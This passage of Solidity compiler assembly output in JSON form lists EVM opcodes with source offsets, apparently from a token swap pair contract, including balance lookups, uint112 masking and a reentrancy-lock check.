											"name": "SWAP3"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 6575,
											"end": 6614,
											"name": "SWAP3"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "SWAP1"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "SWAP2"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "SWAP1"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "DUP3"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "SWAP1"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "SUB"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "ADD"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "DUP2"
										},
										{
											"begin": 6647,
											"end": 6653,
											"name": "DUP7"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "DUP1"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "282"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "282"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "POP"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "GAS"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "STATICCALL"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "283"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "283"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "POP"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "POP"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "POP"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "POP"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "MLOAD"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "284"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "284"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "MLOAD"
										},
										{
											"begin": 6640,
											"end": 6679,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6689,
											"end": 6701,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6704,
											"end": 6727,
											"name": "PUSH [tag]",
											"value": "285"
										},
										{
											"begin": 6704,
											"end": 6712,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6704,
											"end": 6727,
											"name": "DUP8"
										},
										{
											"begin": 6704,
											"end": 6727,
											"name": "AND"
										},
										{
											"begin": 6704,
											"end": 6727,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6704,
											"end": 6716,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 6704,
											"end": 6727,
											"name": "AND"
										},
										{
											"begin": 6704,
											"end": 6727,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6704,
											"end": 6727,
											"name": "tag",
											"value": "285"
										},
										{
											"begin": 6704,
											"end": 6727,
											"name": "JUMPDEST"
										},
										{
											"begin": 6689,
											"end": 6727,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6737,
											"end": 6749,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6752,
											"end": 6775,
											"name": "PUSH [tag]",
											"value": "286"
										},
										{
											"begin": 6752,
											"end": 6760,
											"name": "DUP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6752,
											"end": 6775,
											"name": "DUP8"
										},
										{
											"begin": 6752,
											"end": 6775,
											"name": "AND"
										},
										{
											"begin": 6752,
											"end": 6775,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6752,
											"end": 6764,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 6752,
											"end": 6775,
											"name": "AND"
										},
										{
											"begin": 6752,
											"end": 6775,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6752,
											"end": 6775,
											"name": "tag",
											"value": "286"
										},
										{
											"begin": 6752,
											"end": 6775,
											"name": "JUMPDEST"
										},
										{
											"begin": 6737,
											"end": 6775,
											"name": "SWAP1"
										},
										{
											"begin": 6737,
											"end": 6775,
											"name": "POP"
										},
										{
											"begin": 6786,
											"end": 6796,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6799,
											"end": 6829,
											"name": "PUSH [tag]",
											"value": "287"
										},
										{
											"begin": 6808,
											"end": 6817,
											"name": "DUP8"
										},
										{
											"begin": 6819,
											"end": 6828,
											"name": "DUP8"
										},
										{
											"begin": 6799,
											"end": 6807,
											"name": "PUSH [tag]",
											"value": "204"
										},
										{
											"begin": 6799,
											"end": 6829,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6799,
											"end": 6829,
											"name": "tag",
											"value": "287"
										},
										{
											"begin": 6799,
											"end": 6829,
											"name": "JUMPDEST"
										},
										{
											"begin": 6839,
											"end": 6856,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6859,
											"end": 6870,
											"name": "SLOAD"
										},
										{
											"begin": 6786,
											"end": 6829,
											"name": "SWAP1"
										},
										{
											"begin": 6786,
											"end": 6829,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 6962,
											"end": 6979,
											"name": "DUP1"
										},
										{
											"begin": 6958,
											"end": 7357,
											"name": "PUSH [tag]",
											"value": "288"
										},
										{
											"begin": 6958,
											"end": 7357,
											"name": "JUMPI"
										},
										{
											"begin": 7007,
											"end": 7061,
											"name": "PUSH [tag]",
											"value": "289"
										},
										{
											"begin": 556,
											"end": 563,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 7007,
											"end": 7038,
											"name": "PUSH [tag]",
											"value": "169"
										},
										{
											"begin": 7017,
											"end": 7037,
											"name": "PUSH [tag]",
											"value": "208"
										},
										{
											"begin": 7017,
											"end": 7024,
											"name": "DUP8"
										},
										{
											"begin": 7029,
											"end": 7036,
											"name": "DUP8"
										},
										{
											"begin": 7017,
											"end": 7037,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 7017,
											"end": 7028,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 7017,
											"end": 7037,
											"name": "AND"
										},
										{
											"begin": 7017,
											"end": 7037,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7007,
											"end": 7061,
											"name": "tag",
											"value": "289"
										},
										{
											"begin": 7007,
											"end": 7061,
											"name": "JUMPDEST"
										},
										{
											"begin": 6995,
											"end": 7061,
											"name": "SWAP9"
										},
										{
											"begin": 6995,
											"end": 7061,
											"name": "POP"
										},
										{
											"begin": 7075,
											"end": 7116,
											"name": "PUSH [tag]",
											"value": "292"
										},
										{
											"begin": 7094,
											"end": 7095,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 556,
											"end": 563,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 7075,
											"end": 7085,
											"name": "PUSH [tag]",
											"value": "293"
										},
										{
											"begin": 7075,
											"end": 7116,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7075,
											"end": 7116,
											"name": "tag",
											"value": "292"
										},
										{
											"begin": 7075,
											"end": 7116,
											"name": "JUMPDEST"
										},
										{
											"begin": 7075,
											"end": 7116,
											"name": "POP"
										},
										{
											"begin": 6958,
											"end": 7357,
											"name": "PUSH [tag]",
											"value": "294"
										},
										{
											"begin": 6958,
											"end": 7357,
											"name": "JUMP"
										},
										{
											"begin": 6958,
											"end": 7357,
											"name": "tag",
											"value": "288"
										},
										{
											"begin": 6958,
											"end": 7357,
											"name": "JUMPDEST"
										},
										{
											"begin": 7214,
											"end": 7346,
											"name": "PUSH [tag]",
											"value": "295"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 7240,
											"end": 7277,
											"name": "DUP10"
										},
										{
											"begin": 7240,
											"end": 7277,
											"name": "AND"
										},
										{
											"begin": 7240,
											"end": 7265,
											"name": "PUSH [tag]",
											"value": "214"
										},
										{
											"begin": 7240,
											"end": 7247,
											"name": "DUP7"
										},
										{
											"begin": 7252,
											"end": 7264,
											"name": "DUP5"
										},
										{
											"begin": 7240,
											"end": 7265,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 7240,
											"end": 7251,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 7240,
											"end": 7265,
											"name": "AND"
										},
										{
											"begin": 7240,
											"end": 7265,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7214,
											"end": 7346,
											"name": "tag",
											"value": "295"
										},
										{
											"begin": 7214,
											"end": 7346,
											"name": "JUMPDEST"
										},
										{
											"begin": 7202,
											"end": 7346,
											"name": "SWAP9"
										},
										{
											"begin": 7202,
											"end": 7346,
											"name": "POP"
										},
										{
											"begin": 6958,
											"end": 7357,
											"name": "tag",
											"value": "294"
										},
										{
											"begin": 6958,
											"end": 7357,
											"name": "JUMPDEST"
										},
										{
											"begin": 7386,
											"end": 7387,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7374,
											"end": 7383,
											"name": "DUP10"
										},
										{
											"begin": 7374,
											"end": 7387,
											"name": "GT"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "PUSH [tag]",
											"value": "300"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "JUMPI"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "DUP2"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "MSTORE"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "ADD"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "DUP1"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "DUP1"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "ADD"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "DUP3"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "DUP2"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "SUB"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "DUP3"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "MSTORE"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "PUSH",
											"value": "28"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "DUP2"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "MSTORE"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "ADD"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "DUP1"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "PUSH data",
											"value": "6591C9F5BF1FEFAAD109B76A20E25C857B696080C952191F86220F001A83663E"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "PUSH",
											"value": "28"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "SWAP2"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "CODECOPY"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "ADD"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "SWAP2"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "POP"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "POP"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "MLOAD"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "DUP1"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "SWAP2"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "SUB"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "SWAP1"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "REVERT"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "tag",
											"value": "300"
										},
										{
											"begin": 7366,
											"end": 7432,
											"name": "JUMPDEST"
										},
										{
											"begin": 7442,
											"end": 7467,
											"name": "PUSH [tag]",
											"value": "301"
										},
										{
											"begin": 7453,
											"end": 7455,
											"name": "DUP11"
										},
										{
											"begin": 7457,
											"end": 7466,
											"name": "DUP11"
										},
										{
											"begin": 7442,
											"end": 7452,
											"name": "PUSH [tag]",
											"value": "293"
										},
										{
											"begin": 7442,
											"end": 7467,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7442,
											"end": 7467,
											"name": "tag",
											"value": "301"
										},
										{
											"begin": 7442,
											"end": 7467,
											"name": "JUMPDEST"
										},
										{
											"begin": 7442,
											"end": 7467,
											"name": "POP"
										},
										{
											"begin": 7478,
											"end": 7527,
											"name": "PUSH [tag]",
											"value": "221"
										},
										{
											"begin": 7486,
											"end": 7494,
											"name": "DUP7"
										},
										{
											"begin": 7496,
											"end": 7504,
											"name": "DUP7"
										},
										{
											"begin": 7506,
											"end": 7515,
											"name": "DUP11"
										},
										{
											"begin": 7517,
											"end": 7526,
											"name": "DUP11"
										},
										{
											"begin": 7478,
											"end": 7485,
											"name": "PUSH [tag]",
											"value": "179"
										},
										{
											"begin": 7478,
											"end": 7527,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "tag",
											"value": "123"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "JUMPDEST"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "MSTORE"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP3"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP4"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "MSTORE"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP5"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "KECCAK256"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "MSTORE"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP3"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "MSTORE"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "KECCAK256"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SLOAD"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 754,
											"end": 772,
											"name": "tag",
											"value": "125"
										},
										{
											"begin": 754,
											"end": 772,
											"name": "JUMPDEST"
										},
										{
											"begin": 754,
											"end": 772,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 754,
											"end": 772,
											"name": "SLOAD"
										},
										{
											"begin": 754,
											"end": 772,
											"name": "DUP2"
										},
										{
											"begin": 754,
											"end": 772,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 18295,
											"end": 18509,
											"name": "tag",
											"value": "127"
										},
										{
											"begin": 18295,
											"end": 18509,
											"name": "JUMPDEST"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1292,
											"end": 1300,
											"name": "SLOAD"
										},
										{
											"begin": 1304,
											"end": 1305,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1292,
											"end": 1305,
											"name": "EQ"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH [tag]",
											"value": "306"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "JUMPI"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP3"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MSTORE"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "MLOAD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "DUP2"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SUB"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "ADD"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "SWAP1"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "REVERT"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "tag",
											"value": "306"
										},
										{
											"begin": 1284,
											"end": 1325,
											"name": "JUMPDEST"
										},
										{
											"begin": 1346,
											"end": 1347,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1335,
											"end": 1343,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1335,
											"end": 1347,
											"name": "SSTORE"
										},
										{
											"begin": 18363,
											"end": 18369,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 18363,
											"end": 18369,
											"name": "SLOAD"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "DUP1"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "DUP2"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "MSTORE"
										},
										{
											"begin": 18389,
											"end": 18393,
											"name": "ADDRESS"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "DUP3"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "ADD"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "MSTORE"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "SWAP1"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "MLOAD"
										},
										{
											"begin": 18335,
											"end": 18502,
											"name": "PUSH [tag]",
											"value": "308"
										},
										{
											"begin": 18335,
											"end": 18502,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18363,
											"end": 18369,
											"name": "AND"
										},
										{
											"begin": 18363,
											"end": 18369,
											"name": "SWAP2"
										},
										{
											"begin": 18356,
											"end": 18380,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 18356,
											"end": 18380,
											"name": "SWAP2"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "DUP1"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "DUP4"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "ADD"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "SWAP3"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "SWAP3"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "SWAP2"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "SWAP1"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "DUP3"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "SWAP1"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "SUB"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "ADD"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "DUP2"
										},
										{
											"begin": 18363,
											"end": 18369,
											"name": "DUP7"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "DUP1"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "309"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "309"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "POP"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "GAS"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "STATICCALL"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "310"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "310"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "POP"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "POP"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "POP"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "POP"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "MLOAD"
										},
										{
											"begin": 18356,
											"end": 18395,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
